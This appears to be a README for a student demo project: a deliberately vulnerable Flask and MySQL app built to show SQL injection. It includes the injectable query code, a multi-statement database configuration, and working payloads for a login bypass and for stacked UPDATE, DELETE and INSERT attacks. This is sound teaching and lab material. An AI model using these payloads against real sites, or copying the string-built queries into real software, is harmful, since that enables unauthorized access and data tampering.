# SQL-Injection-Demo

## Project Overview
This project is a demo of SQL Injection vulnerabilities in a simple web application. It implements a deliberately vulnerable Flask web application to showcase various SQL injection attack vectors and their impacts. 

## Project Structure
sql-injection-demo/'

├── app.py        

├── setup.sql     

├── templates/

│   ├── login.html     

│   ├── products.html    

│   └── add_product.html    

├── static/

│   └── css/

│       └── style.css      

└── README.md

## Features

Login Bypass: Enter a sql statement to bypass the login form, logging in as a random user. 
INSERT Injection: Product creation form vulnerable to injection
Delete Injection: Remove products via injection

## Technology Stack

Backend: Python 3 with Flask framework
Database: MySQL with PyMySQL connector
Frontend: HTML, CSS


## Implementation Approach
### 1. Vulnerable Query Construction
The application uses string concatenation instead of parameterized queries:


query = f"SELECT * FROM users WHERE username = '{user}' AND password = '{pwd}';"
cursor.execute(query)
This allows attackers to inject malicious SQL by manipulating the username or password fields.

### 2. Multi-Statement Support
The MySQL connection is configured to allow multiple statements:
pythondb = pymysql.connect(

    host="localhost",
    user="root", #REPLACE WITH USER 
    password="password", #REPLACE WITH YOUR MYSQL PASSWORD
    database="injection_demo",
    client_flag=pymysql.constants.CLIENT.MULTI_STATEMENTS
)
This enables advanced attacks like dropping tables or inserting malicious data.


### 3. Attack Surface Areas
Login Form (/login)

Username and password fields both vulnerable
Allows authentication bypass and data extraction

Add Product Form (/add_product)

Product name field vulnerable to injection
Enables database manipulation through INSERT statements


## Injections and Vulnerabilities Example
### 1. OR-Based Login Bypass
In the login page enter the attack in the password field, and anything for the username.
Attack: ' OR '1'='1' #
SELECT * FROM users WHERE username = '' OR '1'='1' # ' AND password
<img width="1876" height="937" alt="image" src="https://github.com/user-attachments/assets/ed807ccf-b47e-4b59-8f52-2c380919ab9c" />

<img width="1846" height="772" alt="image" src="https://github.com/user-attachments/assets/27fc5a2b-2085-4080-8993-e3f7131ed52f" />
In the password field, I entered the SQL injection statement, and logged in as a username that is gibberish, and not in the database. 


### 2. Update all Prices to specific amount ($0.01)
In the products page, enter the attack. 
Attack: x', 0); UPDATE products SET price = 0.01; #
Price: 0
<img width="1906" height="806" alt="image" src="https://github.com/user-attachments/assets/eab1218a-3c1d-4edf-bf16-ff3ec6d5f7b5" />
<img width="1880" height="822" alt="image" src="https://github.com/user-attachments/assets/501a720b-504a-4637-9fae-358d6ea790ce" />

### 3. Delete specific product
In the products page, you can delete a product by name.
Attack: x', 0); DELETE FROM products WHERE name = 'Laptop'; #
Price: 0
<img width="1856" height="785" alt="image" src="https://github.com/user-attachments/assets/fad17d6d-64a8-439b-b77f-c00bce4cb6bf" />
<img width="1272" height="774" alt="image" src="https://github.com/user-attachments/assets/9806618f-8f46-48db-8835-bfd9a664f88f" />

<img width="1022" height="531" alt="image" src="https://github.com/user-attachments/assets/95e1d643-bd48-4250-8406-015179635a2e" />


### 4.  Insert malicious user
Through the add products page, you can enter a statement to insert a user into the table.
Attack: Test', 0); INSERT INTO users (username, password) VALUES ('SQL', 'Injection'); # 
<img width="1570" height="728" alt="image" src="https://github.com/user-attachments/assets/587d08c0-de2d-4604-8de4-8da81993ecb5" />
<img width="968" height="476" alt="image" src="https://github.com/user-attachments/assets/75363b5d-71d3-43c4-9919-0770ed35b13e" />
<img width="907" height="364" alt="image" src="https://github.com/user-attachments/assets/e505b53b-e88e-4a70-84da-68fa4dbf4460" />

## How to Run
### Prerequisites

Python 3.7 or higher
MySQL Server 8.0 or higher
pip 

### Installation Steps
#### Step 1: Clone the Repository
#### Step 2: Install Python Dependencies
pip install flask pymysql

#### Step 3: Set Up Local MySQL Database
First, log into MySQL (using Local root user):
enter in bash terminal: mysql -u root -p
Go back to bash terminal.
Then run the setup script:
mysql -u root -p < database/schema.sql

This will create the injection_demo database, users, products, and logs tables, and also insert default data (admin/admin123, test/test123, shail/shail123)

#### Step 4: IMPORTANT - Configure Database Credentials

YOU MUST UPDATE THESE LINES IN app.py TO MATCH YOUR MYSQL SETUP:

Open app.py and find this section (around line 6-13):


pythondb = pymysql.connect(

    host="localhost",        # ← Change if MySQL is on different host
    
    user="root",             # ← Change to YOUR MySQL username
    
    password="Shail1234",    # ←  CHANGE THIS TO YOUR MYSQL PASSWORD
    
    database="injection_demo",
    
    autocommit=True,
    
    client_flag=pymysql.constants.CLIENT.MULTI_STATEMENTS
)

Example configurations:

If your MySQL password is "password123":


pythondb = pymysql.connect(

    host="localhost",
    user="root",
    password="password123",  # ← Your actual password here
    database="injection_demo",
    autocommit=True,
    client_flag=pymysql.constants.CLIENT.MULTI_STATEMENTS
)

If you created a different MySQL user:

pythondb = pymysql.connect(

    host="localhost", 
    
    user="myusername",       # ← Your MySQL username
    
    password="mypassword",   # ← Your MySQL password
    
    database="injection_demo",
    
    autocommit=True,
    
    client_flag=pymysql.constants.CLIENT.MULTI_STATEMENTS
)

If MySQL is on a different port:
pythondb = pymysql.connect(

    host="localhost",
    port=3307,               # ← Add port if not default
    user="root",
    password="yourpassword",
    database="injection_demo",
    autocommit=True,
    client_flag=pymysql.constants.CLIENT.MULTI_STATEMENTS
    
)


#### Step 5: Run the application
python app.py
You should see output like:
 * Serving Flask app 'app'
 * Debug mode: on
WARNING: This is a development server. Do not use it in production deployment.
 * Running on http://127.0.0.1:5000

Open your web browser and navigate to:
http://127.0.0.1:5000

## Challenges Faced
### 1. Multi-Statement executions
I was originally using mysql-connector, but multi-statement executions were not being compiled correctly, so I switched to PyMySQL. PyMySQL allows functionality for multi-statements in SQL, this is important when trying to delete a product from the add product page, for example.

### 2. Resetting Database
I was struggling to find ways to reset my database to the original schema I have in place through the web's frontend, but I found running the schema.sql file to be more convenient to use in a smaller demo like this. But because of this, when trying to test for dropping tables, you would need to run the schema again on MySQL.

### 3. Unwanted Data Insertion
When trying to delete products through the products page, I was inserting a product as well. The solution I found was to delete both the malicious entry and the product you want to delete. Attack: dummy', 0); DELETE FROM products WHERE name IN ('Laptop', 'dummy'); #

